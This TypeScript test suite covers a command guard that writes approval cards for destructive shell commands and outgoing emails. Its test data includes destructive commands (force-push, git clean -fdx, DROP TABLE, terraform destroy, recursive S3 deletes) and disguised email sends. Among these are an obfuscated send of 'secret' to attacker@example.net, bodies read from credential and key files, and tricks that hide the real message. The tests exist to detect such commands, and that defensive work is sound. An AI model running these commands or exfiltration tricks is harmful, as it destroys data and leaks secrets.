import { afterAll, describe, expect, test } from 'bun:test';
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

import { describeGate, evaluateBashCommand } from './block-destructive-core';
import { evaluateEmailSend, evaluateEmailToolCall } from './email-gate-core';
import { CARD_LABEL_MAX_CHARS, CARD_SUMMARY_MAX_CHARS, htmlToText } from './gate-card-core';

const scratch = mkdtempSync(join(tmpdir(), 'gate-card-'));
afterAll(() => rmSync(scratch, { recursive: true, force: true }));

function card(command: string) {
    const verdict = evaluateBashCommand(command, { cwd: scratch });
    expect(verdict.action).toBe('gate');
    return describeGate(command, verdict.reason!, scratch);
}

describe('destructive approval description', () => {
    test.each([
        {
            name: 'dbt full refresh resolves the model variable and flags --empty',
            command: 'cd /work/dbt; M=orders_daily; timeout 900 dbt run --select $M --empty --full-refresh',
            label: 'Rebuild dbt model orders_daily from scratch (--full-refresh)',
            has: ['--select orders_daily', 'zero rows', "the profile's default", 'Directory: `/work/dbt`'],
        },
        {
            name: 'a command find -exec runs is described like the same command at top level',
            command: 'find . -name repo -exec git push --force origin main \\;',
            label: 'Force-push main to origin',
            has: ['is overwritten with this local history', 'find -exec runs a command that needs approval'],
        },
        {
            name: 'a command xargs runs is placed in the directory it runs in, not one a later cd moves to',
            command: 'cd /work/dbt; xargs dbt run --full-refresh --select orders < vars; cd /tmp',
            label: 'Rebuild dbt models chosen at run time from scratch (--full-refresh)',
            has: ['Directory: `/work/dbt`'],
        },
        {
            name: 'a command xargs runs through env -C is placed in that directory',
            command: 'cd /safe; xargs env -C /prod dbt run --full-refresh --select orders < vars',
            label: 'Rebuild dbt models chosen at run time from scratch (--full-refresh)',
            has: ['Directory: `/prod`'],
        },
        {
            name: 'a command an xargs shell script runs after its own cd is placed in that directory',
            command: "cd /safe; xargs -a /dev/null sh -c 'cd /prod; dbt run --full-refresh --select orders'",
            label: 'Rebuild dbt model orders from scratch (--full-refresh)',
            has: ['Directory: `/prod`'],
        },
        {
            name: 'find -execdir says the command runs in each match\'s directory',
            command: 'cd /safe; find /prod -name marker -execdir dbt run --full-refresh --select orders \\;',
            label: 'Rebuild dbt model orders from scratch (--full-refresh)',
            has: ['Directory: `the directory of each match`'],
        },
        {
            name: 'a command an xargs shell script runs is described like the same command at top level',
            command: "xargs -I{} sh -c 'psql -c \"DROP TABLE users\"' < list",
            label: 'Drop PostgreSQL table users',
            has: ['Deletes the table `users`'],
        },
        {
            name: 'git clean names what it deletes, that it skips the trash, and what -e keeps',
            command: 'cd /work/app && git clean -fdx -e .env',
            label: 'Permanently delete untracked and ignored files (git clean)',
            has: ['and directories are deleted, skipping the trash', 'such as `.env`', 'Kept: files matching `.env`', 'Directory: `/work/app`'],
        },
        {
            name: 'git clean with a pathspec says matching directories go too, -d or not',
            command: 'git clean -f untracked-dir',
            label: 'Permanently delete untracked files under untracked-dir (git clean)',
            has: ['untracked files and directories under `untracked-dir` are deleted'],
        },
        {
            name: 'git clean reads an abbreviated --exclude as a kept pattern, and composes -C for the directory',
            command: 'git -C /srv -C prod clean -fd --e keep',
            label: 'Permanently delete untracked files (git clean)',
            has: ['Kept: files matching `keep`', 'Directory: `/srv/prod`'],
        },
        {
            name: 'dbt --select= and --selector forms name the selection',
            command: 'dbt run --full-refresh --select=orders',
            label: 'Rebuild dbt model orders from scratch (--full-refresh)',
            has: [],
        },
        {
            name: 'dbt selector',
            command: 'dbt run --full-refresh --selector nightly',
            label: 'Rebuild dbt models chosen by selector nightly from scratch (--full-refresh)',
            has: [],
        },
        {
            name: 'SQL statement keeps its literal values and the connection',
            command: `T=tenant-42; psql "host=db.example.test dbname=app" -c "delete from public.sessions where tenant_id='$T'"`,
            label: 'Delete rows from PostgreSQL table public.sessions',
            has: ["where `tenant_id='tenant-42'`", 'host `db.example.test` · database `app`', 'only from a backup'],
        },
        {
            name: 'a single-quoted $X is SQL text, not a shell variable',
            command: `X=1; psql -h db.example -c 'delete from t where id = $X'`,
            label: 'Delete rows from PostgreSQL table t',
            has: ['where `id = $X`'],
        },
        {
            name: 'SQL without WHERE says every row',
            command: 'snow sql -c dev --role BUILDER -q "delete from analytics.scratch.events"',
            label: 'Delete rows from Snowflake table analytics.scratch.events',
            has: ['every row in', 'connection `dev` · role `BUILDER`', 'Time Travel'],
        },
        {
            name: 'branch deletion names the branch and remote',
            command: 'cd /work/repo && git push -q origin --delete feature-x',
            label: 'Delete remote branch feature-x on origin',
            has: ['Pull requests from it close'],
        },
        {
            name: 'force push names the remote ref of a src:dst refspec',
            command: 'git push -f origin main:prod',
            label: 'Force-push prod to origin',
            has: ['discarded for everyone'],
        },
        {
            name: 'force push of every branch says so',
            command: 'git push --all --force origin',
            label: 'Force-push every local branch to origin',
            has: [],
        },
        {
            name: 'aws names every id',
            command: 'aws ec2 terminate-instances --instance-ids i-123 i-456',
            label: 'AWS ec2 terminate-instances',
            has: ['for `--instance-ids i-123 i-456`'],
        },
        {
            name: 'aws operands come after the operation, not after a global-option value that spells it',
            command: 'aws --profile rm s3 rm s3://prod/key',
            label: 'Delete S3 object s3://prod/key',
            has: [],
        },
        {
            name: '--prune names the refspec it prunes, which can be tags',
            command: "git push --prune origin 'refs/tags/*:refs/tags/*'",
            label: "Delete remote refs on origin that don't exist locally (--prune)",
            has: ['`refs/tags/*:refs/tags/*`', 'include tags'],
        },
        {
            name: 'terraform -target narrows the effect',
            command: 'terraform destroy -target=aws_s3_bucket.logs',
            label: 'Run terraform destroy',
            has: ['the targeted resources: `aws_s3_bucket.logs`'],
        },
    ])('$name', ({ command, label, has }) => {
        const c = card(command);
        expect(c.label).toBe(label);
        for (const text of has) expect(c.summary).toContain(text);
    });

    test.each([
        ['a loop variable', 'for b in a b; do git push origin --delete $b; done', '$b'],
        ['an assignment in a subshell', 'B=keep; (B=gone); git push origin --delete $B', '$B'],
        ['an assignment after ||', 'B=keep; true || B=gone; git push origin --delete $B', '$B'],
        ['an assignment in a branch', 'B=keep; if false; then B=gone; fi; git push origin --delete $B', '$B'],
        ['an append', 'B=keep; B+=-more; git push origin --delete $B', '$B'],
        ['a read', 'B=keep; read B; git push origin --delete $B', '$B'],
        ['a let', 'B=keep; let B=5; git push origin --delete $B', '$B'],
        ['a background assignment', 'B=keep; B=gone & git push origin --delete $B', '$B'],
        ['an && assignment the step is not chained to', 'B=keep; false && B=gone; git push origin --delete $B', '$B'],
        ['a quoted declare', 'B=keep; declare "B=gone"; git push origin --delete $B', '$B'],
    ])('does not resolve %s', (_name, command, variable) => {
        const c = card(command);
        expect(c.summary).not.toContain('keep');
        expect(c.summary).toContain(`\`${variable}\` is only known when the command runs`);
    });

    test('a relative git -C resolves against the directory the command starts in', () => {
        expect(card('cd /srv && git -C repo clean -fd').summary).toContain('Directory: `/srv/repo`');
        expect(card('env -C /srv git -C repo clean -fd').summary).toContain('Directory: `/srv/repo`');
    });

    test('git clean names the work tree GIT_WORK_TREE sets', () => {
        expect(card('cd /repo && GIT_DIR=/repo/.git GIT_WORK_TREE=/srv/staging git clean -fd').summary).toContain('Directory: `/srv/staging`');
        expect(card('GIT_WORK_TREE=/srv/staging git --work-tree=/srv/other clean -fd').summary).toContain('Directory: `/srv/other`');
    });

    test('the last -e rule for a pattern decides what the card says', () => {
        const removed = card("git clean -f -e foo -e '!foo'");
        expect(removed.summary).toContain('Also deleted: files matching `foo`');
        expect(removed.summary).not.toContain('Kept:');
        const kept = card("git clean -f -e '!foo' -e foo");
        expect(kept.summary).toContain('Kept: files matching `foo`');
        expect(kept.summary).not.toContain('Also deleted');
    });

    test('a negated -e pattern reverses what the card says', () => {
        const x = card("git clean -f -X -e '!secret.env'");
        expect(x.summary).toContain('Kept: files matching `secret.env`');
        expect(x.summary).not.toContain('Also deleted');
        const plain = card("git clean -f -e '!secret.env'");
        expect(plain.summary).toContain('Also deleted: files matching `secret.env`, which -e un-ignores');
        expect(plain.summary).not.toContain('Kept:');
    });

    test('git clean -X says an -e pattern is deleted, not kept', () => {
        const c = card('git clean -f -X -e secret.env');
        expect(c.summary).toContain('Also deleted: files matching `secret.env`');
        expect(c.summary).not.toContain('Kept:');
    });

    test('an && assignment holds only for the rest of its chain', () => {
        const c = card('cd /work/dbt && M=orders_daily; dbt run --select $M --full-refresh');
        expect(c.summary).toContain('`$M` is only known when the command runs');
        expect(card('cd /work/dbt && M=orders_daily && dbt run --select $M --full-refresh').label)
            .toBe('Rebuild dbt model orders_daily from scratch (--full-refresh)');
    });

    test('says approval runs the whole command, not just the gated step', () => {
        const c = card('echo start && dbt run --full-refresh --select orders && echo done');
        expect(c.summary).toContain('Approving runs the whole command (3 steps)');
    });

    test('reads the default dbt target from the project profile', () => {
        const project = join(scratch, 'dbt-project');
        mkdirSync(project);
        writeFileSync(join(project, 'dbt_project.yml'), "name: demo\nprofile: 'demo'\n");
        writeFileSync(join(project, 'profiles.yml'), 'other:\n  target: prod\ndemo:\n  target: dev\n  outputs: {}\n');
        const c = card(`cd ${project} && dbt build --full-refresh`);
        expect(c.summary).toContain("`dev` (the profile's default");
    });

    test('a non-gated command falls back to the reason, under a plain line saying the guard could not tell what it does', () => {
        expect(describeGate('ls -la', 'some reason')).toEqual({
            label: 'some reason',
            summary: "The guard flagged this command as able to delete or overwrite something but couldn't work out what; check the full command before approving.",
        });
    });

    test('a description that would overflow is cut to the budget', () => {
        const long = (i: number) => `delete from analytics.scratch.${'t'.repeat(400)}${i}`;
        const c = card(`snow sql -q "${long(1)}; ${long(2)}; ${long(3)}"`);
        expect(c.summary.length).toBeLessThanOrEqual(CARD_SUMMARY_MAX_CHARS);
        expect(c.summary.length).toBeGreaterThan(CARD_SUMMARY_MAX_CHARS - 60);
        expect(c.label.length).toBeLessThanOrEqual(CARD_LABEL_MAX_CHARS);
        expect(c.label.endsWith('…')).toBe(true);
    });
});

describe('SQL descriptions claim no WHERE only for a statement the guard parsed whole', () => {
    // A psql heredoc writes a dollar-quoted literal as `\$tag\$` so the shell passes `$tag$` through.
    const heredocUpdate = String.raw`psql -h db.example "$DB_URL" <<SQL
BEGIN;
UPDATE app.users SET role='X', access=\$ua\$[{"scope":"reports","level":"read"}]\$ua\$::jsonb, updated_at=now() WHERE id = 1 AND tenant_id='t' RETURNING id;
COMMIT;
SQL`;
    // The literal's content comes from a variable, so the raw heredoc text holds `$$`.
    const runtimeLiteral = String.raw`V=$(cat ./grant.json); cat > grant.sql <<EOF
UPDATE app.users
   SET role = 'Viewer', access = \$ua\$${'$'}{V}\$ua\$::jsonb
 WHERE id = 7 AND access = '{"admin": false}'::jsonb
RETURNING id, access->'admin' AS admin;
EOF
psql -h db.example "$DB_URL" -f grant.sql`;

    test.each([
        ['a dollar-quoted literal written for an unquoted heredoc', heredocUpdate, "`id = 1 AND tenant_id='t'`"],
        ['a dollar-quoted literal filled from a variable', runtimeLiteral, "`id = 7 AND access = '{\"admin\": false}'::jsonb`"],
    ])('%s: still gated, and described as not parsed with the WHERE another reading finds', (_name, command, where) => {
        const c = card(command);
        expect(c.label).toBe('Update rows in PostgreSQL table app.users');
        expect(c.summary).not.toContain('every row');
        expect(c.summary).not.toContain('no WHERE');
        expect(c.summary).toContain("The guard couldn't fully parse this statement");
        expect(c.summary).toContain(`Read another way, it is limited to rows where ${where}.`);
        expect(c.summary.split('\n')[0]).toBe(
            "Changes rows in the table `app.users` in the PostgreSQL database on `db.example` (the guard couldn't tell which rows); only a backup can bring back what it deletes or overwrites.",
        );
    });

    test("another statement's WHERE on the same table is never borrowed", () => {
        const c = card(String.raw`V=$(cat ./v.txt); psql -h db.example "$DB_URL" <<SQL
UPDATE app.t SET v = \$q\$${'$'}{V}\$q\$;
UPDATE app.t SET v = 1 WHERE id = 7;
SQL`);
        expect(c.summary).not.toContain('Read another way');
        expect(c.summary).toContain('Rewrites every row in `app.t` (no WHERE clause).');
    });

    test('a literal that never closes is described as not parsed, and gates as before', () => {
        const c = card(`psql -h db.example -c "UPDATE app.users SET note = 'unterminated WHERE id = 1"`);
        expect(c.summary).not.toContain('every row');
        expect(c.summary).toContain("The guard couldn't fully parse this statement");
    });

    test('a DELETE whose WHERE sits after a literal that never closes names no rows', () => {
        const c = card(`psql -h db.example -c "DELETE FROM app.sessions WHERE note = 'open"`);
        expect(c.summary).not.toContain('every row');
        expect(c.summary).not.toContain('where `');
        expect(c.summary).toContain("The guard couldn't fully parse this statement");
    });

    test('a parsed UPDATE with no WHERE still says every row', () => {
        const c = card(`psql -h db.example.test -d app -c "UPDATE app.users SET role = 'X'"`);
        expect(c.label).toBe('Update every row in PostgreSQL table app.users');
        expect(c.summary).toContain('Rewrites every row in `app.users` (no WHERE clause).');
    });

    test("a DELETE's condition is its own WHERE, not one inside a literal or a subquery", () => {
        expect(card(`psql -h db.example -c "DELETE FROM app.t RETURNING 'WHERE x'"`).summary).toContain('every row in `app.t` (no WHERE clause)');
        expect(card(`psql -h db.example -c "DELETE FROM app.t USING (SELECT id FROM app.u WHERE gone) g RETURNING 1"`).summary)
            .toContain('chosen by a condition inside a subquery');
    });

    test('a statement that runs twice is listed twice, though each reading of the input finds it', () => {
        const c = card(`psql -h db.example -c 'UPDATE app.balances SET amount = amount / 2; UPDATE app.balances SET amount = amount / 2;'`);
        expect(c.label).toBe('Update every row in PostgreSQL table app.balances (+1 more)');
        expect(c.summary.split('\n')[0]).toContain('plus 1 more statement that can delete or overwrite data');
        const heredoc = card('psql -h db.example <<SQL\nUPDATE app.balances SET amount = 0;\nSQL');
        expect(heredoc.label).toBe('Update every row in PostgreSQL table app.balances');
    });

    test('a statement after block words is described by its verb', () => {
        const c = card(`psql -h db.example -c "DO \\$\\$ BEGIN DELETE FROM app.t WHERE id = 3; END \\$\\$"`);
        expect(c.label).toBe('Delete rows from PostgreSQL table app.t');
        expect(c.summary).toContain('where `id = 3`');
    });
});

describe('every card opens with one plain sentence', () => {
    test.each([
        [
            'git clean -x',
            'cd /work/app && git clean -fdx',
            "Permanently deletes every file not saved in Git in `/work/app`, including ignored files, which often hold secrets and local data; they skip the trash and can't be recovered.",
        ],
        [
            'force push',
            'git push -f origin main',
            "Overwrites the history of the branch `main` on the shared copy `origin` with this copy's; work others saved there that this copy doesn't have is lost for everyone.",
        ],
        [
            'remote branch delete',
            'git push origin --delete feature-x',
            'Deletes the branch `feature-x` from the shared copy `origin`; work saved only on it is lost unless someone has a copy, and its pull requests close.',
        ],
        [
            'DROP TABLE',
            'psql -h db.example.test -d app -c "DROP TABLE app.orders"',
            'Deletes the table `app.orders` and all its data in the PostgreSQL database `app` on `db.example.test`; only a backup can bring back what it deletes or overwrites.',
        ],
        [
            'Snowflake DELETE with a WHERE',
            `snow sql -c dev -q "delete from analytics.scratch.events where day < '2026-01-01'"`,
            'Deletes some rows from the table `analytics.scratch.events` in Snowflake (connection `dev`); only Snowflake Time Travel can bring back what it deletes or overwrites, and only for a limited time.',
        ],
        [
            'dbt full refresh',
            'dbt run --full-refresh --select orders --target prod',
            'Deletes and rebuilds the dbt model `orders` from scratch in the dbt target `prod`; rows that only earlier runs kept are lost for good.',
        ],
        [
            'S3 delete',
            'aws s3 rm --recursive s3://example-bucket/exports/',
            "Deletes every file under `s3://example-bucket/exports/` from Amazon S3 cloud storage; it can't be recovered unless the bucket keeps old versions.",
        ],
        [
            'terraform destroy',
            'terraform destroy',
            "Runs `terraform destroy`, which destroys every resource this Terraform state manages; the resources and the data in them can't be brought back.",
        ],
        [
            'a command with no plain description of its own',
            'gcloud compute instances delete web-1',
            'Runs `gcloud compute instances`, which the guard flags as able to delete or overwrite something; it may not be possible to undo.',
        ],
    ])('%s', (_name, command, headline) => {
        const c = card(command);
        const [first, blank] = c.summary.split('\n');
        expect(first).toBe(headline);
        expect(blank).toBe('');
    });

    test('says how many more gated steps the card describes', () => {
        const c = card('git push -f origin main && git clean -fd');
        expect(c.summary.split('\n')[0]).toEndWith(' The command has 1 more step like this, described below.');
    });
});

const INTERACTIVE = { isScheduledTask: false };
const CREDS = 'export GOOGLE_WORKSPACE_CLI_CREDENTIALS_FILE=/home/node/.config/gws/accounts/support.json';

describe('email approval description', () => {
    test('shows a body staged in a variable as readable text', () => {
        const command = `${CREDS}
BODY='<div style="font-size:14px">
<p>Hi Sam,</p>
<p>The export isn'"'"'t ready &amp; will ship <b>Friday</b>.</p>
</div>'
gws gmail +send --to sam@example.com --subject "Export" --body "$BODY" --html`;
        const v = evaluateEmailSend(command, INTERACTIVE);
        expect(v.action).toBe('gate');
        expect(v.summary).toContain("> Hi Sam,\n> \n> The export isn't ready & will ship Friday.");
        expect(v.summary).not.toContain('$BODY');
        expect(v.summary).not.toContain('<p>');
    });

    test('a normal send with the credentials prefix is described as one send', () => {
        const v = evaluateEmailSend(`${CREDS}\ngws gmail +send --to a@example.com --subject "gws update" --body hello`, INTERACTIVE);
        expect(v.label).toBe('Email send to a@example.com: "gws update"');
        expect(v.summary).not.toContain('⚠️');
    });

    test.each([
        ['an && chain the send is not part of', `B='real text'; false && B='decoy'; gws gmail +send --to a@example.com --body "$B"`],
        ['an eval', `B='decoy'; eval "B='real text'"; gws gmail +send --to a@example.com --body "$B"`],
        ['a background job', `B='real text'; B='decoy' & gws gmail +send --to a@example.com --body "$B"`],
    ])('withholds a body changed by %s', (_name, command) => {
        const v = evaluateEmailSend(command, INTERACTIVE);
        expect(v.summary).not.toContain('decoy');
        expect(v.summary).toContain('Message: not shown.');
    });

    test.each([
        ['a quoted read', `read "B" < /dev/null`],
        ['a quoted unset', `unset 'B'`],
        ['a quoted declare', `declare "B=real"`],
        ['a quoted export', `export "B=real"`],
        ['printf -v', `printf -v "B" real`],
        ['printf -vB', `printf -vB real`],
        ['builtin eval', `builtin eval "B=real"`],
        ['command eval', `command eval "B=real"`],
        ['builtin read', `builtin read B < /dev/null`],
        ['a nameref', `declare -n R=B; R=real`],
        ['an arithmetic command', `(( B = 5 ))`],
        ['an arithmetic expansion', `: $((B=5))`],
        ['wait -p', `wait -n -p B`],
        ['an fd redirect', `exec {B}>/dev/null`],
        ['a disguised command name', `e\\val "B=real"`],
        ['a function', `f() { B=real; }; f`],
        ['a brace-expanded eval', `{eval,B=real}`],
        ['a globbed eval', `ev?l B=real`],
        ['a bracket-globbed eval', `[e]val B=real`],
        ['an old-style arithmetic expansion', `: $[B=5]`],
        ['an arithmetic subscript', `: \${X[B=1]}`],
        ['a substring offset', `: \${X:B=2}`],
        ['a default assignment', `: \${B:=real}`],
    ])('withholds a body after %s', (_name, change) => {
        const v = evaluateEmailSend(`B='decoy'; ${change}; gws gmail +send --to a@example.com --body "$B"`, INTERACTIVE);
        expect(v.summary).not.toContain('decoy');
    });

    test.each(['RANDOM', 'SECONDS', 'PWD', 'UID'])('never resolves the shell-managed %s', (name) => {
        const v = evaluateEmailSend(`${name}='decoy'; cd /tmp; gws gmail +send --to a@example.com --body "$${name}"`, INTERACTIVE);
        expect(v.summary).not.toContain('decoy');
    });

    test('still resolves past commands that cannot change variables', () => {
        const v = evaluateEmailSend(`B='kept'; cd /tmp; echo hi | grep h; printf '%s' x; gws gmail +send --to a@example.com --body "$B"`, INTERACTIVE);
        expect(v.summary).toContain('> kept');
    });

    test('a generated command word gets no reassurance', () => {
        const v = evaluateEmailSend("gws gmail +send --to a@example.com --body hi --dry-run; $(echo Z3dz | base64 -d) gmail +send --to b@example.net", INTERACTIVE);
        expect(v.summary).not.toContain('sends nothing');
        expect(v.summary).toContain('built when the command runs');
    });

    test('an unquoted variable the shell would split is not shown as one value', () => {
        const v = evaluateEmailSend(`B='hello world'; gws gmail +send --to a@example.com --body $B`, INTERACTIVE);
        expect(v.summary).not.toContain('> hello world');
    });

    test('an ANSI-C quoted body renders its escapes', () => {
        const v = evaluateEmailSend(`gws gmail +send --to a@example.com --body $'line one\\nit\\'s two'`, INTERACTIVE);
        expect(v.summary).toContain("> line one\n> it's two");
        expect(evaluateEmailSend(`gws gmail +send --to a@example.com --body $'\\x41BC'`, INTERACTIVE).summary).toContain('> ABC');
    });

    test('shows the body bash would send, not a value set somewhere it does not reach', () => {
        const v = evaluateEmailSend(`B='real text'; (B='decoy'); gws gmail +send --to a@example.com --body "$B"`, INTERACTIVE);
        expect(v.summary).not.toContain('decoy');
        expect(v.summary).toContain('Message: not shown. The text comes from `"$B"`');
    });

    test("a single-quoted '$B' body is sent literally", () => {
        const v = evaluateEmailSend(`B=secret; gws gmail +send --to a@example.com --body '$B'`, INTERACTIVE);
        expect(v.summary).toContain('> $B');
        expect(v.summary).not.toContain('secret');
    });

    test('reads an email-type body file under a working directory', () => {
        const file = join(scratch, 'reply.html');
        writeFileSync(file, '<p>Draft from a file.</p>');
        const v = evaluateEmailSend(`BODY=$(cat ${file})\ngws gmail +send --to a@example.com --body "$BODY" --html`, INTERACTIVE);
        expect(v.summary).toContain('> Draft from a file.');
        expect(v.summary).toContain(`Read from \`${file}\``);
    });

    test.each([
        ['a credentials file', 'creds.json'],
        ['a dotfile', '.env'],
        ['an email-type file in a dot directory', '.hidden/body.txt'],
        ['a credential-looking path', 'token.txt'],
        ['an api key file', 'openai-apikey.txt'],
        ['an ssh key', 'id_rsa.txt'],
        ['a symlink to a file outside the working directories', 'link.html'],
    ])('never shows %s', (_name, name) => {
        const file = join(scratch, name);
        if (name === 'link.html') symlinkSync(join(import.meta.dir, '../../../../README.md'), file);
        else {
            mkdirSync(join(file, '..'), { recursive: true });
            writeFileSync(file, 'refresh_token=do-not-show');
        }
        const v = evaluateEmailSend(`B=$(cat ${file})\ngws gmail +send --to a@example.com --body "$B"`, INTERACTIVE);
        expect(v.summary).toContain('that file is not shown here');
        expect(v.summary).not.toContain('do-not-show');
    });

    test('never shows an email-type file outside the working directories', () => {
        const readme = join(import.meta.dir, '../../../../README.md');
        const v = evaluateEmailSend(`B=$(cat ${readme})\ngws gmail +send --to a@example.com --body "$B"`, INTERACTIVE);
        expect(v.summary).toContain('that file is not shown here');
    });

    test('never shows a /proc file', () => {
        const v = evaluateEmailSend('B=$(cat /proc/self/status)\ngws gmail +send --to a@example.com --body "$B"', INTERACTIVE);
        expect(v.summary).toContain('that file is not shown here');
        expect(v.summary).not.toContain('Pid:');
    });

    test('says the body is hidden when it is only built at run time', () => {
        const v = evaluateEmailSend('BODY=$(python3 build.py)\ngws gmail +send --to a@example.com --body "$BODY"', INTERACTIVE);
        expect(v.summary).toContain('Message: not shown. The text comes from `"$BODY"`');
    });

    test.each([
        { verb: '+reply', extra: '', to: 'the original sender (or its Reply-To address)' },
        { verb: '+reply-all', extra: '', to: 'the original sender (or its Reply-To address) and everyone on To/Cc' },
        { verb: '+reply-all', extra: '--to new@example.com', to: 'the original sender (or its Reply-To address) and everyone on To/Cc, plus new@example.com' },
    ])('$verb $extra says who receives the reply', ({ verb, extra, to }) => {
        const v = evaluateEmailSend(`gws gmail ${verb} --message-id 18f1 --body "Thanks" ${extra}`, INTERACTIVE);
        expect(v.summary).toContain(`To: ${to}`);
        expect(v.label).not.toContain('unknown recipient');
    });

    test('names every recipient when --to repeats', () => {
        const v = evaluateEmailSend('gws gmail +send --to a@example.com --to b@example.com --body hi', INTERACTIVE);
        expect(v.summary).toContain('To: a@example.com, b@example.com');
    });

    test('flags a lone help or dry-run call that is gated only because the command chains other steps', () => {
        const v = evaluateEmailSend('gws gmail +reply --help 2>&1 | grep -i to; node notify.js', INTERACTIVE);
        expect(v.action).toBe('gate');
        expect(v.label).toContain('(--help — check the command)');
        expect(v.summary).toContain('which on its own sends nothing');
    });

    test('a decoy chain names every address and never reassures', () => {
        const v = evaluateEmailSend(
            "gws gmail +send --to friend@example.com --body 'see you' --dry-run; gws gmail +s$(echo e)nd --to attacker@example.net --body secret",
            INTERACTIVE,
        );
        expect(v.label).toContain('attacker@example.net');
        expect(v.summary).toContain('Addresses named anywhere in the command: friend@example.com, attacker@example.net');
        expect(v.summary).not.toContain('sends nothing');
    });

    test('a native connector send shows the message text', () => {
        const v = evaluateEmailToolCall('mcp__gmail__send_email', {
            to: 'sam@example.com',
            subject: 'Status',
            html_body: '<p>All <i>green</i>.</p>',
        }, INTERACTIVE);
        expect(v.summary).toContain('> All green.');
    });

    test('a body cannot ping, link or forge lines in the channel the description is posted to', () => {
        const v = evaluateEmailSend(
            'gws gmail +send --to a@example.com --subject "Hi\nTo: someone@else" --body "FYI <!channel> <@U123> <https://evil.test|https://bank.test>"',
            INTERACTIVE,
        );
        expect(v.summary).toContain('> FYI ‹!channel> ‹@U123> ‹https://evil.test|https://bank.test>');
        expect(v.summary).toContain('Subject: Hi To: someone@else');
    });

    test('a long multi-byte body is cut to the budget in UTF-16 units', () => {
        const v = evaluateEmailSend(`gws gmail +send --to a@example.com --body "${'🙂'.repeat(2000)}"`, INTERACTIVE);
        expect(v.summary!.length).toBeLessThanOrEqual(CARD_SUMMARY_MAX_CHARS);
        expect(v.summary).toContain('…');
    });

    test.each([
        ['an unclosed anchor', '<p>hi ' + '<a href="x" '.repeat(6000)],
        ['an unclosed script', '<script>'.repeat(9000)],
        ['an unclosed comment', '<!--'.repeat(15000)],
    ])('renders %s quickly', (_name, html) => {
        const started = performance.now();
        htmlToText(html);
        evaluateEmailToolCall('mcp__gmail__send_email', { to: 'a@example.com', html_body: html }, INTERACTIVE);
        expect(performance.now() - started).toBeLessThan(3000);
    });

    test('many variable references after builtins stay fast', () => {
        const command = `B=hi && echo ${'export '.repeat(8000)} && gws gmail +send --to a@example.com --body "${'$B'.repeat(40)}"`;
        const started = performance.now();
        evaluateEmailSend(command, INTERACTIVE);
        describeGate(`T=x; echo ${'unset '.repeat(8000)}; git push origin --delete $T`, 'reason');
        expect(performance.now() - started).toBeLessThan(3000);
    });

    test('a deeply nested command is still gated and does not throw', () => {
        const d = 10_000;
        const command = 'gws gmail +send --to a@example.com --body ' + '"$('.repeat(d) + 'x' + ')"'.repeat(d);
        const started = performance.now();
        expect(evaluateEmailSend(command, INTERACTIVE).action).toBe('gate');
        expect(performance.now() - started).toBeLessThan(3000);
    });
});
